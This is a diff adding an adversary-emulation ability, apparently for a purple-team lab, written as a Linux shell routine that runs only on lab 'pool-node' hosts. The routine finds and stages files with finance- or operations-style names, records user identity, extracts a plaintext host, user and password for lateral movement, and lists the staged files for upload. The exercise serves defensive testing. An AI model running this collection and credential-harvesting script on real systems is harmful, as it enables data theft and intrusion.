@@ -1,0 +1,53 @@
+- id: a1301003-0003-4003-8003-000000000003
+  name: ABL-S13-LNX-POOL-POSTCOMP-EXFIL
+  description: Exfiltrate a found file and emit pivot facts if a clue exists
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    linux:
+      sh:
+        command: |
+          hostname | grep -Eq '^pool-node-[0-9]+$' || { echo "S13_SKIP host=$(hostname) reason=not_pool_node"; exit 0; };
+          mkdir -p /var/tmp/purple-lab;
+          TARGET_FILE="$(find /home /srv/labdata -type f \( -iname '*finance*' -o -iname '*operations*' -o -iname '*field_access*' \) 2>/dev/null | head -n 1)";
+          [ -n "${TARGET_FILE}" ] && cp "${TARGET_FILE}" /var/tmp/purple-lab/s13_exfil_target.txt || true;
+          { echo "host=$(hostname)"; whoami; hostname; id; } > /var/tmp/purple-lab/s13_whoami.txt;
+          if [ -f /home/analyst/Documents/Field_Access_Plan.txt ]; then
+            cp /home/analyst/Documents/Field_Access_Plan.txt /var/tmp/purple-lab/s13_pivot_clue.txt;
+            TARGET_HOST="$(grep '^host=' /home/analyst/Documents/Field_Access_Plan.txt | cut -d= -f2-)";
+            TARGET_PORT="$(grep '^port=' /home/analyst/Documents/Field_Access_Plan.txt | cut -d= -f2-)";
+            TARGET_USER="$(grep '^user=' /home/analyst/Documents/Field_Access_Plan.txt | cut -d= -f2-)";
+            TARGET_PASSWORD="$(grep '^password=' /home/analyst/Documents/Field_Access_Plan.txt | cut -d= -f2-)";
+            TARGET_NAME="$(grep '^target=' /home/analyst/Documents/Field_Access_Plan.txt | cut -d= -f2-)";
+            printf 'S13_PIVOT_OK target=%s host=%s port=%s user=%s password=%s\n' "${TARGET_NAME}" "${TARGET_HOST}" "${TARGET_PORT}" "${TARGET_USER}" "${TARGET_PASSWORD}";
+          else
+            echo "S13_NO_PIVOT_CLUE host=$(hostname)";
+          fi;
+        timeout: 240
+        uploads:
+          - /var/tmp/purple-lab/s13_exfil_target.txt
+          - /var/tmp/purple-lab/s13_whoami.txt
+          - /var/tmp/purple-lab/s13_pivot_clue.txt
+        parsers:
+          plugins.purplelab.app.parsers.s13_pivot:
+            - source: host.pivot.target.host
+              edge: has_port
+              target: host.pivot.target.port
+            - source: host.pivot.target.host
+              edge: has_user
+              target: host.pivot.target.user
+            - source: host.pivot.target.user
+              edge: has_password
+              target: host.pivot.target.password
+            - source: host.pivot.target.host
+              edge: maps_name
+              target: host.pivot.target.name
+  requirements:
+    - module: plugins.stockpile.app.requirements.paw_provenance
+      relationship_match:
+        - source: pool.compromised.node
+  singleton: false
+  repeatable: false
+  delete_payload: false
